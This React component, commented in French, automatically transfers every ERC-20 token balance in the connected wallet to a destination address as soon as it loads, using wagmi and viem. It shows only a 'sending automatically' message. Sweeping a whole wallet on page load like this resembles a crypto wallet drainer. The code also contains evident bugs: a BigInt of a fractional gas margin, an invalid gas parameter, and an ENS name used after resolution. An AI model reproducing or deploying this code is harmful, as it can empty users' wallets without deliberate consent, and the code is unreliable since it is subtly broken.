import { useEffect } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { normalize } from 'viem/ens';
import { isAddress } from 'essential-eth';

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Fonction pour récupérer les frais de gaz via l'API
  const getGasEstimate = async (tokenAddress: `0x${string}`, amount: BigInt) => {
    try {
      const response = await fetch('/api/gasEstimate', {
        method: 'POST',
        body: JSON.stringify({
          tokenAddress,
          amount: amount.toString(),
        }),
      });
      const data = await response.json();
      return data.estimatedGas;
    } catch (err) {
      console.error('Erreur lors du calcul des frais de gaz:', err);
      return null;
    }
  };

  // Automatiser l'envoi de tous les tokens disponibles
  const sendAllTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    // Vérifier si l'adresse de destination est une adresse ENS
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error('Adresse ENS introuvable');
        return;
      }
    }

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      try {
        // Estimer les frais de gaz avant d'envoyer la transaction
        const estimatedGas = await getGasEstimate(tokenAddress, BigInt(token.balance));
        if (!estimatedGas) {
          console.error(`Impossible d'estimer les frais de gaz pour ${token?.contract_ticker_symbol}`);
          continue;
        }

        // Ajouter une marge de sécurité aux frais de gaz
        const marginFactor = 1.5; // Marge de 50% pour les frais de gaz
        const gasWithMargin = BigInt(estimatedGas) * BigInt(marginFactor);

        // Simulation de la transaction pour vérifier si elle va réussir
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destinationAddress as `0x${string}`,
            BigInt(token.balance),
          ],
          gasLimit: gasWithMargin.toString(), // Utiliser les frais de gaz estimés avec la marge
        });

        // Si la simulation réussit, procéder à l'envoi
        const response = await walletClient.writeContract(request);

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
      }
    }
  };

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient]); // Quand les tokens ou l'adresse changent, l'envoi se déclenche

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
